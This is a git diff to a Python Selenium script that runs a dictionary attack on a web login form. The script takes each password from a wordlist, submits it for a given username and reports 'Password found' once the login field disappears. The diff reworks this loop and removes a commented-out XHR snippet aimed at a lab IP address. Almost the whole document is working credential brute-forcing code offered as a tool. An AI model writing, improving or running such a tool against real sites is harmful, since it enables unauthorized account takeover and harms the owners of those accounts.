@@ -6,6 +6,7 @@ import requests
 import time
 import os
 from selenium import webdriver
+from selenium.common.exceptions import NoSuchElementException
 import argparse
 from selenium.webdriver.chrome.service import Service
 from selenium.webdriver.common.by import By
@@ -86,60 +87,25 @@ def brutes(username, usr_sel ,pass_sel,button_sel,word_list, url, delay):
     print (color.GREEN+'[*] Starting dictionary attack against '+color.YELLOW+username+color.GREEN+' with a '+color.YELLOW+delay+color.GREEN+' seconds delay\n'+color.END)
     with open(word_list, 'r') as f:
         for passwd in f:
+            print(color.BLUE+"[~] Attempting password "+color.YELLOW+passwd+color.END, end='')
             try:
                 driver.get(url)
                 Sel_user = driver.find_element(By.CSS_SELECTOR, usr_sel)
                 Sel_pas = driver.find_element(By.CSS_SELECTOR, pass_sel)
                 driver.find_element(By.CSS_SELECTOR, button_sel)
                 Sel_user.send_keys(username)
-                print(color.BLUE+"[~] Attempting password "+color.YELLOW+passwd+color.END, end='')
-                Sel_pas.send_keys(passwd)
+                Sel_pas.send_keys(passwd+"\n")
                 time.sleep(int(delay))
                 final_pass = passwd
-
-                # Get status_code using Javascript (Doesn't work yet)
-
-                # js = '''
-                # let callback = arguments[0];
-                # let xhr = new XMLHttpRequest();
-                # xhr.open('GET', ' '''+str(url)+''' ', 'http://10.10.203.148/login', true);
-                # xhr.onload = function () {
-                #     if (this.readyState === 4) {
-                #         callback(this.status);
-                #     }
-                # };
-                # xhr.onerror = function () {
-                #     callback('error');
-                # };
-                # xhr.send(null);
-                # '''
-
-                # status_code = driver.execute_async_script(js)
-                # print(status_code) 
-
-            except KeyboardInterrupt:
-                sys.exit(color.RED+'\n[!] User interrupt'+color.END)
-            except selenium.common.exceptions.NoSuchElementException:
+                if not driver.find_element(By.CSS_SELECTOR, usr_sel).is_displayed():
+                    sys.exit(color.GREEN+'\nPassword found: '+color.RED+final_pass+color.END)
+            except NoSuchElementException:
                 if final_pass == None:
                     sys.exit(color.RED+'\n[+] An error occured'+color.END)
                 else:
-                    sys.exit(color.GREEN+'\nPassword found: '+color.PURPLE+final_pass+color.END)
-            try:
-                driver.get(url)
-                Sel_user = driver.find_element(By.CSS_SELECTOR, usr_sel)
-                Sel_pas = driver.find_element(By.CSS_SELECTOR, pass_sel)
-                driver.find_element(By.CSS_SELECTOR, button_sel)
-                Sel_user.send_keys(username)
-                Sel_pas.send_keys(man)
-                time.sleep(int(delay))
-                final_pass = man
+                    sys.exit(color.GREEN+'\nPassword found: '+color.RED+final_pass+color.END)
             except KeyboardInterrupt:
                 sys.exit(color.RED+'\n[!] User interrupt'+color.END)
-            except selenium.common.exceptions.NoSuchElementException:
-                if final_pass == None:
-                    sys.exit(color.RED+'\n[+] An error occured'+color.END)
-                else:
-                    sys.exit(color.GREEN+'\nPassword found: '+color.PURPLE+final_pass+color.END)
     sys.exit(color.RED+'\n[-] Password not found'+color.END)
 
 def banner():
